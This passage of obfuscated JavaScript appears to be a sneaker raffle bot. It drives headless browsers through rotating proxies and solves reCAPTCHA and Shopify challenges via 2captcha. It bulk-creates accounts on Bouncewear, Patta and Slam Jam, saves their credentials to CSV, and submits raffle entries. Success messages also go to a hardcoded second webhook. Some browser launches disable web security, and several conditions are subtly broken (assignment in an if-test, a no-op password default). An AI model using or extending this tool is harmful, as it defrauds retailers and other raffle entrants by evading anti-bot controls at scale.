                'password': '' + _0x1365bb[0x3]
            }), console['log'](_0x21f008() + '\x20[' + _0x51554f['name'] + ']\x20Task\x20' + (_0x3ce304 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x55c22d['setRequestInterception'](!![]), _0x55c22d['on']('request', _0x132bf4 => {
                _0x132bf4['resourceType']() === 'image' || _0x132bf4['resourceType']() === 'font' || _0x132bf4['resourceType']() === 'media' ? _0x132bf4['abort']() : _0x132bf4['continue']();
            }), await _0x55c22d['goto'](_0x4ec658), await _0x4e5841(0xbb8), await _0x55c22d['waitForSelector']('#RegisterForm-FirstName'), console['log'](_0x21f008() + '\x20[' + _0x51554f['name'] + ']\x20Task\x20' + (_0x3ce304 + 0x1) + '\x20:\x20Filling\x20information'), await _0x55c22d['type']('#RegisterForm-FirstName', '' + bouncewear[_0x3ce304]['FirstName']), await _0x4e5841(0x226), await _0x55c22d['type']('#RegisterForm-LastName', '' + bouncewear[_0x3ce304]['LastName']), await _0x4e5841(0x226), await _0x55c22d['type']('#RegisterForm-email', '' + bouncewear[_0x3ce304]['Email']), await _0x4e5841(0x226), await _0x55c22d['type']('#RegisterForm-password', '' + bouncewear[_0x3ce304]['Password']), await _0x4e5841(0x226), await _0x55c22d['click']('#marketing'), console['log'](_0x21f008() + '\x20[' + _0x51554f['name'] + ']\x20Task\x20' + (_0x3ce304 + 0x1) + '\x20:\x20Submitting..'), await _0x55c22d['$eval']('#RegisterForm', _0x181449 => _0x181449['submit']()), await _0x4e5841(0x1f40), console['log'](_0x21f008() + '\x20[' + _0x51554f['name'] + ']\x20Task\x20' + (_0x3ce304 + 0x1) + '\x20:\x20Solving\x20Captcha'), await _0x55c22d['solveRecaptchas'](), await _0x55c22d['click']('.shopify-challenge__button.btn');
            async function _0x23c9c2() {
                for (var _0x5ecc67 = 0x0; _0x5ecc67 < 0x4; _0x5ecc67++) {
                    try {
                        console['log']('try'), await _0x55c22d['waitForSelector']('.shopify-challenge__error', { 'timeout': 0x1388 }), console['log'](_0x21f008() + '\x20[' + _0x51554f['name'] + ']\x20Task\x20' + (_0x3ce304 + 0x1) + '\x20:\x20' + _0x108b38['red']('Catpcha\x20failed,\x20retrying..')), await _0x55c22d['solveRecaptchas'](), await _0x55c22d['click']('.shopify-challenge__button.btn');
                    } catch {
                        console['log']('catch');
                        break;
                    }
                }
            }
            await _0x23c9c2(), console['log'](_0x21f008() + '\x20[' + _0x51554f['name'] + ']\x20Task\x20' + (_0x3ce304 + 0x1) + '\x20:\x20Captcha\x20Solved'), await _0x4e5841(0x1f4);
            try {
                await _0x55c22d['waitForSelector']('.featured-title'), await _0x4e5841(0x1f4), console['log'](_0x108b38['green'](_0x21f008() + '\x20[' + _0x51554f['name'] + ']\x20Task\x20' + (_0x3ce304 + 0x1) + '\x20:\x20Account\x20' + bouncewear[_0x3ce304]['Email'] + '\x20Generated!')), _0x3fdbd7['appendFileSync']('../accounts/bouncewear.csv', '\x0a' + bouncewear[_0x3ce304]['Email'] + ',' + bouncewear[_0x3ce304]['Password']), console['log'](_0x108b38['yellow'](_0x21f008() + '\x20[' + _0x51554f['name'] + ']\x20Task\x20' + (_0x3ce304 + 0x1) + '\x20:\x20Account\x20' + bouncewear[_0x3ce304]['Email'] + '\x20Saved\x20in\x20\x27accounts/bouncewear.csv\x27'));
            } catch (_0x3c7877) {
                console['log'](_0x108b38['red'](_0x21f008() + '\x20[' + _0x3962b3[taskModule]['name'] + ']\x20Task\x20' + (_0x3ce304 + 0x1) + '\x20:\x20Account\x20genration\x20failed.\x20' + _0x3c7877));
            }
        } catch (_0x3ff760) {
            console['log'](_0x108b38['red'](_0x21f008() + '\x20[' + _0x3962b3[taskModule]['name'] + ']\x20Task\x20' + (_0x3ce304 + 0x1) + '\x20:\x20' + _0x3ff760));
        } finally {
            _0x33f6e4 && _0x33f6e4['close'](), console['log']('Waiting\x20for\x20' + _0x4c3205['delay'] + '\x20ms'), await _0x4e5841(_0x4c3205['delay']);
        }
    }
}
async function _0x823fb6(_0x450703, _0x595f2f, _0x201d03, _0x4f8e38) {
    _0x4ec495['use'](_0x21618b()), _0x4ec495['use'](_0x480aae({
        'provider': {
            'id': '2captcha',
            'token': '' + _0x4c3205['captchaKey']
        },
        'visualFeedback': !![]
    }));
    for (var _0x587766 = 0x0; _0x587766 < _0x201d03['length']; _0x587766++) {
        var _0x41a7dd = [{
            'type': 'rich',
            'title': 'Succesful\x20Patta\x20Account\x20Generated',
            'description': '',
            'color': 0xc0d6d6,
            'fields': [
                {
                    'name': 'User',
                    'value': '' + _0x4ca7a9
                },
                {
                    'name': 'Delay',
                    'value': '' + _0x4c3205['delay']
                },
                {
                    'name': 'Version',
                    'value': '' + _0x4351c2
                }
            ]
        }];
        const _0x2f2efd = { 'embeds': _0x41a7dd };
        _0x4204b1(_0x595f2f['name'] + '\x20Task\x20' + (_0x587766 + 0x1) + '\x20/\x20' + _0x201d03['length'] + '\x20||\x20File:\x20' + _0x4a41d1 + '\x20Proxies:\x20' + _0x36f446), await _0x3e9f80(_0x201d03, _0x587766);
        var _0x1816a3 = await _0x5b798c(_0x201d03[_0x587766], _0x595f2f, 'acc', ![]);
        const _0xb86e8f = { 'succesDEVMSG': { 'embeds': [_0x1816a3] } };
        if (_0x201d03[_0x587766]['Email'] == '' || _0x201d03[_0x587766]['FirstName'] == '' || _0x201d03[_0x587766]['LastName'] == '') {
            console['log'](_0x21f008() + '\x20[' + _0x3962b3[taskModule]['name'] + ']\x20Task\x20' + (_0x587766 + 0x1) + '\x20:\x20Invalid\x20CSV'), await _0x4e5841(0x7d0);
            continue;
        }
        (_0x201d03[_0x587766]['Password'] == '' || _0x201d03[_0x587766] == undefined) && _0x201d03[_0x587766]['Password'] == 'JRaffles23!';
        if (_0x4c3205['useRandomProxy'] = ![])
            var _0x168e2a = _0x4f8e38[_0x587766]['split'](':');
        else
            var _0xb5f8e = Math['round'](Math['random']() * (_0x4f8e38['length'] - 0x1)), _0x168e2a = _0x4f8e38[_0xb5f8e]['split'](':');
        const _0x7d552f = await _0x4ec495['launch']({
            'headless': !![],
            'args': [
                '--proxy-server=' + _0x168e2a[0x0] + ':' + _0x168e2a[0x1],
                '--no-sandbox',
                '--disable-setuid-sandbox'
            ]
        });
        try {
            const _0x2e3218 = await _0x7d552f['newPage']();
            await _0x2e3218['authenticate']({
                'username': '' + _0x168e2a[0x2],
                'password': '' + _0x168e2a[0x3]
            }), console['log'](_0x21f008() + '\x20[' + _0x595f2f['name'] + ']\x20Task\x20' + (_0x587766 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x2e3218['setRequestInterception'](!![]), _0x2e3218['on']('request', _0x173d54 => {
                _0x173d54['resourceType']() === 'image' || _0x173d54['resourceType']() === 'font' || _0x173d54['resourceType']() === 'media' ? _0x173d54['abort']() : _0x173d54['continue']();
            }), await _0x2e3218['goto'](_0x450703), await _0x4e5841(0xbb8), await _0x2e3218['waitForSelector']('#RegisterForm-FirstName'), console['log'](_0x21f008() + '\x20[' + _0x595f2f['name'] + ']\x20Task\x20' + (_0x587766 + 0x1) + '\x20:\x20Filling\x20information'), await _0x2e3218['type']('#RegisterForm-FirstName', '' + _0x201d03[_0x587766]['FirstName']), await _0x4e5841(0x226), await _0x2e3218['type']('#RegisterForm-LastName', '' + _0x201d03[_0x587766]['LastName']), await _0x4e5841(0x226), await _0x2e3218['type']('#RegisterForm-email', '' + _0x201d03[_0x587766]['Email']), await _0x4e5841(0x226), await _0x2e3218['type']('#RegisterForm-password', '' + _0x201d03[_0x587766]['Password']), await _0x4e5841(0x226), console['log'](_0x21f008() + '\x20[' + _0x595f2f['name'] + ']\x20Task\x20' + (_0x587766 + 0x1) + '\x20:\x20Submitting..'), await _0x2e3218['$eval']('#RegisterForm', _0x159b59 => _0x159b59['submit']()), await _0x4e5841(0x1f40);
            try {
                await _0x2e3218['waitForSelector']('.home-page-grid__collection'), await _0x4e5841(0x1f4), console['log'](_0x108b38['green'](_0x21f008() + '\x20[' + _0x595f2f['name'] + ']\x20Task\x20' + (_0x587766 + 0x1) + '\x20:\x20Account\x20' + _0x201d03[_0x587766]['Email'] + '\x20Generated!')), _0x3fdbd7['appendFileSync']('../accounts/patta.csv', '\x0a' + _0x201d03[_0x587766]['Email'] + ',' + _0x201d03[_0x587766]['Password']), console['log'](_0x108b38['yellow'](_0x21f008() + '\x20[' + _0x595f2f['name'] + ']\x20Task\x20' + (_0x587766 + 0x1) + '\x20:\x20Account\x20' + _0x201d03[_0x587766]['Email'] + '\x20Saved\x20in\x20\x27accounts/patta.csv\x27'));
                try {
                    _0x4c3205['webhook'] != undefined && _0x4c3205['webhook'] != '' && await _0x331f59(_0x4c3205['webhook'], _0xb86e8f['succesDEVMSG']);
                } catch {
                }
                await _0x331f59(_0x2055ba, _0xb86e8f['succesDEVMSG']);
            } catch (_0x4ce4aa) {
                console['log'](_0x108b38['red'](_0x21f008() + '\x20[' + _0x3962b3[taskModule]['name'] + ']\x20Task\x20' + (_0x587766 + 0x1) + '\x20:\x20Account\x20genration\x20failed.\x20' + _0x4ce4aa));
            }
        } catch (_0x56811f) {
            console['log'](_0x108b38['red'](_0x21f008() + '\x20[' + _0x3962b3[taskModule]['name'] + ']\x20Task\x20' + (_0x587766 + 0x1) + '\x20:\x20' + _0x56811f));
        } finally {
            _0x7d552f && _0x7d552f['close'](), console['log']('Waiting\x20for\x20' + _0x4c3205['delay'] + '\x20ms'), await _0x4e5841(_0x4c3205['delay']);
        }
    }
}
async function _0x14d30c(_0x49b1a0, _0x417a13, _0x443887, _0x17ca6) {
    _0x4ec495['use'](_0x21618b()), _0x4ec495['use'](_0x480aae({
        'provider': {
            'id': '2captcha',
            'token': '' + _0x4c3205['captchaKey']
        },
        'visualFeedback': !![]
    }));
    for (var _0x59f50a = 0x0; _0x59f50a < _0x443887['length']; _0x59f50a++) {
        var _0x4877da;
        if (_0xa116e7 != 'yes')
            var _0xa116e7 = '', _0x39f579 = 0x0;
        _0x4204b1(_0x417a13['name'] + '\x20Task\x20' + (_0x59f50a + 0x1) + '\x20/\x20' + _0x443887['length'] + '\x20||\x20File:\x20' + _0x4a41d1 + '\x20Proxies:\x20' + _0x36f446), await _0x3e9f80(_0x443887, _0x59f50a);
        if (_0x443887[_0x59f50a]['Email'] == '' || _0x443887[_0x59f50a]['Password'] == '' || _0x443887[_0x59f50a]['FirstName'] == '' || _0x443887[_0x59f50a]['LastName'] == '') {
            console['log'](_0x21f008() + '\x20[' + _0x3962b3[taskModule]['name'] + ']\x20Task\x20' + (_0x59f50a + 0x1) + '\x20:\x20Invalid\x20CSV');
            continue;
        }
        if (_0x4c3205['useRandomProxy'] = ![])
            var _0x5ef3e4 = _0x17ca6[_0x59f50a]['split'](':');
        else
            var _0x2b238c = Math['round'](Math['random']() * (_0x17ca6['length'] - 0x1)), _0x5ef3e4 = _0x17ca6[_0x2b238c]['split'](':');
        const _0x12b479 = await _0x4ec495['launch']({
            'headless': ![],
            'args': [
                '--proxy-server=' + _0x5ef3e4[0x0] + ':' + _0x5ef3e4[0x1],
                '--no-sandbox',
                '--disable-setuid-sandbox'
            ]
        });
        try {
            const _0x4739e6 = await _0x12b479['newPage']();
            await _0x4739e6['authenticate']({
                'username': '' + _0x5ef3e4[0x2],
                'password': '' + _0x5ef3e4[0x3]
            }), console['log'](_0x21f008() + '\x20[' + _0x417a13['name'] + ']\x20Task\x20' + (_0x59f50a + 0x1) + '\x20:\x20Getting\x20Session'), await _0x4739e6['setRequestInterception'](!![]), _0x4739e6['on']('request', _0x44df20 => {
                _0x44df20['resourceType']() === 'image' || _0x44df20['resourceType']() === 'font' || _0x44df20['resourceType']() === 'media' ? _0x44df20['abort']() : _0x44df20['continue']();
            }), await _0x4739e6['goto']('https://www.patta.nl/nl/account/login', {
                'waitUntil': 'networkidle2',
                'timeout': 0xea60
            }), await _0x4739e6['waitForSelector']('#CustomerEmail'), console['log'](_0x21f008() + '\x20[' + _0x417a13['name'] + ']\x20Task\x20' + (_0x59f50a + 0x1) + '\x20:\x20Logging\x20in..'), await _0x4739e6['type']('#CustomerEmail', '' + _0x443887[_0x59f50a]['Email']), await _0x4e5841(0x12c), await _0x4739e6['type']('#CustomerPassword', '' + _0x443887[_0x59f50a]['Password']), await _0x4e5841(0x226), await _0x4739e6['$eval']('#customer_login', _0x1f704a => _0x1f704a['submit']());
            try {
                await _0x4739e6['waitForSelector']('#orders'), await _0x4e5841(0x4b0);
            } catch {
                console['log'](_0x108b38['red'](_0x21f008() + '\x20[' + _0x417a13['name'] + ']\x20Task\x20' + (_0x59f50a + 0x1) + '\x20:\x20Task\x20failed,\x20invalid\x20credentials'));
                continue;
            }
            await _0x4739e6['goto']('' + _0x443887[_0x59f50a]['Url'], {
                'waitUntil': 'networkidle2',
                'timeout': 0xea60
            }), await _0x4e5841(0xbb8), console['log'](_0x21f008() + '\x20[' + _0x417a13['name'] + ']\x20Task\x20' + (_0x59f50a + 0x1) + '\x20:\x20Starting\x20Entry');
            try {
                await _0x4739e6['waitForSelector']('#email');
            } catch {
                console['log'](_0x108b38['red'](_0x21f008() + '\x20[' + _0x417a13['name'] + ']\x20Task\x20' + (_0x59f50a + 0x1) + '\x20:\x20Duplicate\x20entry/\x20Account\x20error'));
            }
            await _0x4739e6['type']('#email', '' + _0x443887[_0x59f50a]['Email']), await _0x4e5841(0x384), await _0x4739e6['type']('#first_name', '' + _0x443887[_0x59f50a]['FirstName']), await _0x4e5841(0x514), await _0x4739e6['type']('#last_name', '' + _0x443887[_0x59f50a]['LastName']), await _0x4e5841(0x514), await _0x4739e6['type']('#street_address', _0x443887[_0x59f50a]['Address1'] + '\x20' + _0x443887[_0x59f50a]['HouseNumber'] + '\x20' + _0x443887[_0x59f50a]['Address2']), await _0x4e5841(0x2bc);
            _0x443887[_0x59f50a]['Postcode'] == undefined && (_0x443887[_0x59f50a]['Postcode'] = _0x443887[_0x59f50a]['Zip']);
            await _0x4739e6['type']('#zip_code', '' + _0x443887[_0x59f50a]['Postcode']), await _0x4e5841(0x320), await _0x4739e6['type']('#city', '' + _0x443887[_0x59f50a]['City']), await _0x4e5841(0x320), await _0x4739e6['type']('#bday', '01/01/1994'), await _0x4e5841(0x320), await _0x4739e6['type']('#instagram', '' + _0x443887[_0x59f50a]['Follower']), await _0x4e5841(0x352);
            if (_0x443887[_0x59f50a]['Size'] == 'RANDOM') {
                const _0x5e02ed = await _0x4739e6['$$eval']('div[id=\x22raffle__size-selector-container\x22]\x20>\x20label', _0xf01892 => {
                    return _0xf01892['map'](_0x510098 => _0x510098['textContent']);
                });
                var _0x5e381b = Math['round'](Math['random']() * (_0x5e02ed['length'] - 0x1));
                console['log'](_0x21f008() + '\x20[' + _0x417a13['name'] + ']\x20Task\x20' + (_0x59f50a + 0x1) + '\x20:\x20Picking\x20Random\x20Size\x20' + _0x5e02ed[_0x5e381b]), await _0x4739e6['click']('label[data-eu-size=\x22' + _0x5e02ed[_0x5e381b] + '\x22]');
            } else {
                console['log'](_0x21f008() + '\x20[' + _0x417a13['name'] + ']\x20Task\x20' + (_0x59f50a + 0x1) + '\x20:\x20Picking\x20Size\x20' + _0x443887[_0x59f50a]['Size']);
                try {
                    await _0x4739e6['click']('label[data-eu-size=\x22' + _0x443887[_0x59f50a]['Size'] + '\x22]');
                } catch {
                    await _0x4739e6['click']('label[data-eu-size=\x22' + _0x443887[_0x59f50a]['Size'] + '.0\x22]');
                }
            }
            await _0x4e5841(0xbb8), await _0x4739e6['$$eval']('.raffle__checkbox-label', _0x4d7e6b => _0x4d7e6b['forEach'](_0x1d1018 => _0x1d1018['click']())), await _0x4e5841(0x7d0), console['log'](_0x21f008() + '\x20[' + _0x417a13['name'] + ']\x20Task\x20' + (_0x59f50a + 0x1) + '\x20:\x20Submitting\x20Entry'), await _0x4739e6['click']('#raffle__form-submit'), await _0x4e5841(0x1388);
            try {
                await _0x4739e6['waitForSelector']('#raffle__confirmation-message-container'), _0xa116e7 = 'no', _0x4fb703(_0x443887[_0x59f50a], _0x417a13), console['log'](_0x108b38['green'](_0x21f008() + '\x20[' + _0x417a13['name'] + ']\x20Task\x20' + (_0x59f50a + 0x1) + '\x20:\x20Raffle\x20Entered!'));
            } catch (_0x2ec31f) {
                console['log'](_0x108b38['red'](_0x21f008() + '\x20[' + _0x3962b3[taskModule]['name'] + ']\x20Task\x20' + (_0x59f50a + 0x1) + '\x20:\x20Raffle\x20entry\x20failed.\x20' + _0x2ec31f));
            }
        } catch (_0x265acf) {
            console['log'](_0x108b38['red'](_0x21f008() + '\x20[' + _0x3962b3[taskModule]['name'] + ']\x20Task\x20' + (_0x59f50a + 0x1) + '\x20:\x20' + _0x265acf)), _0xa116e7 = 'yes';
        } finally {
            _0x12b479 && _0x12b479['close']();
            if (_0xa116e7 == 'yes' && _0x39f579 != 0x5 && _0x4877da != 'Size\x20Not\x20Found') {
                console['log'](_0x108b38['red'](_0x21f008() + '\x20[' + _0x417a13['name'] + ']\x20Task\x20' + (_0x59f50a + 0x1) + '\x20:\x20Retrying')), _0x59f50a = _0x59f50a - 0x1, _0x39f579 = _0x39f579 + 0x1;
                continue;
            }
            _0xa116e7 == 'yes' && _0x39f579 >= 0x5 && (_0x20b8ba(_0x443887[_0x59f50a], _0x417a13), _0xa116e7 = 'no', _0x39f579 = 0x0), console['log']('Waiting\x20for\x20' + _0x4c3205['delay'] + '\x20ms'), await _0x4e5841(_0x4c3205['delay']);
        }
    }
}
async function _0x2947dc(_0x417f9d, _0x201373, _0x13a1ae, _0x244132) {
    _0x4ec495['use'](_0x21618b()), _0x4ec495['use'](_0x480aae({
        'provider': {
            'id': '2captcha',
            'token': '' + _0x4c3205['captchaKey']
        },
        'visualFeedback': !![]
    }));
    for (var _0xeb4b9d = 0x0; _0xeb4b9d < _0x13a1ae['length']; _0xeb4b9d++) {
        if (_0x1a752d != 'yes')
            var _0x1a752d = '', _0x53d639 = 0x0;
        var _0x1be420 = [{
            'type': 'rich',
            'title': 'Succesful\x20Patta\x20Account\x20Generated',
            'description': '',
            'color': 0xc0d6d6,
            'fields': [
                {
                    'name': 'User',
                    'value': '' + _0x4ca7a9
                },
                {
                    'name': 'Delay',
                    'value': '' + _0x4c3205['delay']
                },
                {
                    'name': 'Version',
                    'value': '' + _0x4351c2
                }
            ]
        }];
        const _0x108dd4 = { 'embeds': _0x1be420 };
        _0x4204b1(_0x201373['name'] + '\x20Task\x20' + (_0xeb4b9d + 0x1) + '\x20/\x20' + _0x13a1ae['length'] + '\x20||\x20File:\x20' + _0x4a41d1 + '\x20Proxies:\x20' + _0x36f446), await _0x3e9f80(_0x13a1ae, _0xeb4b9d);
        var _0xc99fa1 = await _0x5b798c(_0x13a1ae[_0xeb4b9d], _0x201373, 'acc', ![]);
        const _0x27fd82 = { 'succesDEVMSG': { 'embeds': [_0xc99fa1] } };
        if (_0x13a1ae[_0xeb4b9d]['Email'] == '' || _0x13a1ae[_0xeb4b9d]['FirstName'] == '' || _0x13a1ae[_0xeb4b9d]['LastName'] == '') {
            console['log'](_0x21f008() + '\x20[' + _0x3962b3[taskModule]['name'] + ']\x20Task\x20' + (_0xeb4b9d + 0x1) + '\x20:\x20Invalid\x20CSV'), await _0x4e5841(0x7d0);
            continue;
        }
        (_0x13a1ae[_0xeb4b9d]['Password'] == '' || _0x13a1ae[_0xeb4b9d] == undefined) && _0x13a1ae[_0xeb4b9d]['Password'] == 'JRaffles23!';
        if (_0x4c3205['useRandomProxy'] = ![])
            var _0x3dae09 = _0x244132[_0xeb4b9d]['split'](':');
        else
            var _0x2578e0 = Math['round'](Math['random']() * (_0x244132['length'] - 0x1)), _0x3dae09 = _0x244132[_0x2578e0]['split'](':');
        const _0x3c1482 = await _0x4ec495['launch']({
            'headless': !![],
            'args': [
                '--proxy-server=' + _0x3dae09[0x0] + ':' + _0x3dae09[0x1],
                '--no-sandbox',
                '--disable-setuid-sandbox'
            ]
        });
        try {
            const _0x5ae310 = await _0x3c1482['newPage']();
            await _0x5ae310['authenticate']({
                'username': '' + _0x3dae09[0x2],
                'password': '' + _0x3dae09[0x3]
            }), console['log'](_0x21f008() + '\x20[' + _0x201373['name'] + ']\x20Task\x20' + (_0xeb4b9d + 0x1) + '\x20:\x20Getting\x20Session'), await _0x5ae310['setRequestInterception'](!![]), _0x5ae310['on']('request', _0x5acd92 => {
                _0x5acd92['resourceType']() === 'image' || _0x5acd92['resourceType']() === 'font' || _0x5acd92['resourceType']() === 'media' ? _0x5acd92['abort']() : _0x5acd92['continue']();
            }), await _0x5ae310['goto']('https://drop.slamjam.com/account/register'), await _0x4e5841(0xbb8), await _0x5ae310['waitForSelector']('#FirstName'), await _0x5ae310['waitForSelector']('.iubenda-cs-accept-btn.iubenda-cs-btn-primary'), await _0x5ae310['click']('.iubenda-cs-accept-btn.iubenda-cs-btn-primary'), console['log'](_0x21f008() + '\x20[' + _0x201373['name'] + ']\x20Task\x20' + (_0xeb4b9d + 0x1) + '\x20:\x20Filling\x20information'), await _0x4e5841(0x4b0), await _0x5ae310['type']('#FirstName', '' + _0x13a1ae[_0xeb4b9d]['FirstName']), await _0x4e5841(0x226), await _0x5ae310['type']('#LastName', '' + _0x13a1ae[_0xeb4b9d]['LastName']), await _0x4e5841(0x226), await _0x5ae310['type']('#Email', '' + _0x13a1ae[_0xeb4b9d]['Email']), await _0x4e5841(0x2ee), await _0x5ae310['type']('#ConfirmEmail', '' + _0x13a1ae[_0xeb4b9d]['Email']), await _0x4e5841(0x2ee), await _0x5ae310['type']('#CreatePassword', '' + _0x13a1ae[_0xeb4b9d]['Password']), await _0x4e5841(0x2ee), await _0x5ae310['type']('#CreateConfirmPassword', '' + _0x13a1ae[_0xeb4b9d]['Password']), await _0x4e5841(0x226), console['log'](_0x21f008() + '\x20[' + _0x201373['name'] + ']\x20Task\x20' + (_0xeb4b9d + 0x1) + '\x20:\x20Submitting..'), await _0x5ae310['$eval']('#create_customer', _0x1fd3a8 => _0x1fd3a8['submit']()), await _0x4e5841(0x1388), console['log'](_0x21f008() + '\x20[' + _0x201373['name'] + ']\x20Task\x20' + (_0xeb4b9d + 0x1) + '\x20:\x20' + _0x108b38['cyan']('Solving\x20Captcha')), await _0x5ae310['solveRecaptchas'](), console['log'](_0x21f008() + '\x20[' + _0x201373['name'] + ']\x20Task\x20' + (_0xeb4b9d + 0x1) + '\x20:\x20Captcha\x20solved'), await _0x5ae310['$eval']('.shopify-challenge__container\x20>\x20form', _0x19ef7e => _0x19ef7e['submit']());
            try {
                await _0x5ae310['waitForSelector']('.product-card__image'), await _0x4e5841(0x1f4), _0x1a752d = 'no', console['log'](_0x108b38['green'](_0x21f008() + '\x20[' + _0x201373['name'] + ']\x20Task\x20' + (_0xeb4b9d + 0x1) + '\x20:\x20Account\x20' + _0x13a1ae[_0xeb4b9d]['Email'] + '\x20Generated!')), _0x3fdbd7['appendFileSync']('../accounts/slamjam.csv', '\x0a' + _0x13a1ae[_0xeb4b9d]['Email'] + ',' + _0x13a1ae[_0xeb4b9d]['Password']), console['log'](_0x108b38['yellow'](_0x21f008() + '\x20[' + _0x201373['name'] + ']\x20Task\x20' + (_0xeb4b9d + 0x1) + '\x20:\x20Account\x20' + _0x13a1ae[_0xeb4b9d]['Email'] + '\x20Saved\x20in\x20\x27accounts/slamjam.csv\x27'));
                try {
                    _0x4c3205['webhook'] != undefined && _0x4c3205['webhook'] != '' && await _0x331f59(_0x4c3205['webhook'], _0x27fd82['succesDEVMSG']);
                } catch {
                }
                await _0x331f59(_0x2055ba, _0x27fd82['succesDEVMSG']);
            } catch (_0x36ed07) {
                console['log'](_0x108b38['red'](_0x21f008() + '\x20[' + _0x3962b3[taskModule]['name'] + ']\x20Task\x20' + (_0xeb4b9d + 0x1) + '\x20:\x20Account\x20genration\x20failed.\x20' + _0x36ed07));
            }
        } catch (_0xe91614) {
            console['log'](_0x108b38['red'](_0x21f008() + '\x20[' + _0x3962b3[taskModule]['name'] + ']\x20Task\x20' + (_0xeb4b9d + 0x1) + '\x20:\x20' + _0xe91614));
        } finally {
            _0x3c1482 && _0x3c1482['close']();
            if (_0x1a752d == 'yes' && _0x53d639 != 0x5) {
                console['log'](_0x108b38['red'](_0x21f008() + '\x20[' + _0x201373['name'] + ']\x20Task\x20' + (_0xeb4b9d + 0x1) + '\x20:\x20Retrying')), _0xeb4b9d = _0xeb4b9d - 0x1, _0x53d639 = _0x53d639 + 0x1;
                continue;
            }
            _0x1a752d == 'yes' && _0x53d639 >= 0x5 && (_0x20b8ba(_0x13a1ae[_0xeb4b9d], _0x201373), _0x1a752d = 'no', _0x53d639 = 0x0), console['log']('Waiting\x20for\x20' + _0x4c3205['delay'] + '\x20ms'), await _0x4e5841(_0x4c3205['delay']);
        }
    }
}
async function _0x591868(_0x2849a2, _0x2fc6cc, _0x4c6fbc, _0x1ce3cb) {
    _0x4ec495['use'](_0x21618b()), _0x4ec495['use'](_0x480aae({
        'provider': {
            'id': '2captcha',
            'token': '' + _0x4c3205['captchaKey']
        },
        'visualFeedback': !![]
    }));
    for (var _0x5d125d = 0x0; _0x5d125d < _0x4c6fbc['length']; _0x5d125d++) {
        var _0x29fd4b;
        if (_0x43cd48 != 'yes')
            var _0x43cd48 = '', _0x21ab10 = 0x0;
        _0x4204b1(_0x2fc6cc['name'] + '\x20Task\x20' + (_0x5d125d + 0x1) + '\x20/\x20' + _0x4c6fbc['length'] + '\x20||\x20File:\x20' + _0x4a41d1 + '\x20Proxies:\x20' + _0x36f446), await _0x3e9f80(_0x4c6fbc, _0x5d125d);
        if (_0x4c6fbc[_0x5d125d]['Email'] == '' || _0x4c6fbc[_0x5d125d]['Password'] == '' || _0x4c6fbc[_0x5d125d]['FirstName'] == '' || _0x4c6fbc[_0x5d125d]['LastName'] == '') {
            console['log'](_0x21f008() + '\x20[' + _0x2fc6cc['name'] + ']\x20Task\x20' + (_0x5d125d + 0x1) + '\x20:\x20Invalid\x20CSV');
            continue;
        }
        if (_0x4c3205['useRandomProxy'] = ![])
            var _0x4bacb5 = _0x1ce3cb[_0x5d125d]['split'](':');
        else
            var _0x4b11bb = Math['round'](Math['random']() * (_0x1ce3cb['length'] - 0x1)), _0x4bacb5 = _0x1ce3cb[_0x4b11bb]['split'](':');
        const _0x4b961b = await _0x4ec495['launch']({
            'headless': !![],
            'args': [
                '--proxy-server=' + _0x4bacb5[0x0] + ':' + _0x4bacb5[0x1],
                '--no-sandbox',
                '--disable-setuid-sandbox',
                '--disable-web-security',
                '--disable-features=IsolateOrigins',
                '\x20--disable-site-isolation-trials'
            ]
        });
        try {
            const _0x43b8df = await _0x4b961b['newPage']();
            await _0x43b8df['authenticate']({
                'username': '' + _0x4bacb5[0x2],
                'password': '' + _0x4bacb5[0x3]
            }), await _0x43b8df['setViewport']({
                'width': 0x500,
                'height': 0x2d0
            }), console['log'](_0x21f008() + '\x20[' + _0x2fc6cc['name'] + ']\x20Task\x20' + (_0x5d125d + 0x1) + '\x20:\x20Getting\x20Session'), await _0x43b8df['setRequestInterception'](!![]), _0x43b8df['on']('request', _0x107957 => {
                _0x107957['resourceType']() === 'image' || _0x107957['resourceType']() === 'font' || _0x107957['resourceType']() === 'media' ? _0x107957['abort']() : _0x107957['continue']();
            }), await _0x43b8df['goto']('https://drop.slamjam.com/account/login', {
                'waitUntil': 'networkidle2',
                'timeout': 0xea60
            }), await _0x43b8df['waitForSelector']('.iubenda-cs-accept-btn.iubenda-cs-btn-primary'), await _0x43b8df['click']('.iubenda-cs-accept-btn.iubenda-cs-btn-primary'), await _0x4e5841(0x258), await _0x43b8df['waitForSelector']('#CustomerEmail'), console['log'](_0x21f008() + '\x20[' + _0x2fc6cc['name'] + ']\x20Task\x20' + (_0x5d125d + 0x1) + '\x20:\x20Logging\x20in..'), await _0x43b8df['type']('#CustomerEmail', '' + _0x4c6fbc[_0x5d125d]['Email']), await _0x4e5841(0x12c), await _0x43b8df['type']('#CustomerPassword', '' + _0x4c6fbc[_0x5d125d]['Password']), await _0x4e5841(0x226), await _0x43b8df['$eval']('#customer_login', _0x38f53c => _0x38f53c['submit']()), await _0x4e5841(0x7d0), await _0x43b8df['waitForSelector']('iframe[title=\x22reCAPTCHA\x22]'), console['log'](_0x21f008() + '\x20[' + _0x2fc6cc['name'] + ']\x20Task\x20' + (_0x5d125d + 0x1) + '\x20:\x20' + _0x108b38['cyan']('Solving\x20Captcha')), await _0x43b8df['solveRecaptchas'](), console['log'](_0x21f008() + '\x20[' + _0x2fc6cc['name'] + ']\x20Task\x20' + (_0x5d125d + 0x1) + '\x20:\x20Captcha\x20Solved'), await _0x43b8df['$eval']('.shopify-challenge__container\x20>\x20form', _0x35d1d3 => _0x35d1d3['submit']());
            try {
                await _0x43b8df['waitForSelector']('.nav-account'), await _0x4e5841(0x4b0);
            } catch {
                console['log'](_0x108b38['red'](_0x21f008() + '\x20[' + _0x2fc6cc['name'] + ']\x20Task\x20' + (_0x5d125d + 0x1) + '\x20:\x20Task\x20failed,\x20invalid\x20credentials'));
                continue;
            }
            await _0x43b8df['goto']('' + _0x4c6fbc[_0x5d125d]['Url'], {
                'waitUntil': 'networkidle2',
                'timeout': 0xea60
            }), await _0x4e5841(0xbb8), console['log'](_0x21f008() + '\x20[' + _0x2fc6cc['name'] + ']\x20Task\x20' + (_0x5d125d + 0x1) + '\x20:\x20Starting\x20Entry');
            try {
                await _0x43b8df['waitForSelector']('#ProductSelect-product-template-raffle');
            } catch {
            }
